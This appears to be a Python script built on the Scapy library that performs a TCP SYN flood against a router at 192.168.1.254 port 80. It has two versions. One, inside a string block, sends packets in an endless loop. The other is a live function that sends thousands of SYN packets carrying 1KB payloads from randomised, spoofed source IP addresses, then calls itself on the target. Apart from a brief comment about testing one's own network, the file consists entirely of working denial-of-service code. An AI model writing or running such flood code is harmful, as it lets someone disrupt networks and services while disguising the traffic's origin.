"""
This top one works until you cancel it


from scapy.all import *
from scapy.all import IP, TCP, RandShort

#should be a router or firewall
target_ip = "192.168.1.254"

target_port = 80

ip = IP(dst=target_ip)


# forge a TCP SYN packet with a random source port
# and the target port as the destination port
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")

# add some flooding data (1KB in this case)
raw = Raw(b"X"*1024)

# stack up the layers
p = ip / tcp / raw
# send the constructed packet in a loop until CTRL+C is detected 
send(p, loop=1, verbose=0)
"""
# whereas this one works for a specified amount of packets
from scapy.all import IP, TCP, Raw, RandShort, send
from random import randint

# Target configuration (for testing in YOUR environment)
target_ip = "192.168.1.254"  # Replace with your router's IP
target_port = 80             # Replace with an open port on your router

# Function to send a high volume of SYN packets
def syn_flood(target_ip, target_port, packet_count=10000):
    print(f"Starting SYN flood attack on {target_ip}:{target_port}")
    for i in range(packet_count):
        # Randomize source IP and port to simulate distributed traffic
        src_ip = f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
        ip = IP(src=src_ip, dst=target_ip)
        tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
        raw = Raw(b"X" * 1024)  # 1KB payload to increase load
        packet = ip / tcp / raw
        send(packet, verbose=0)  # Send the packet without verbose output
    print("Attack completed.")

# Example: Flood the router
syn_flood(target_ip, target_port, packet_count=5000)
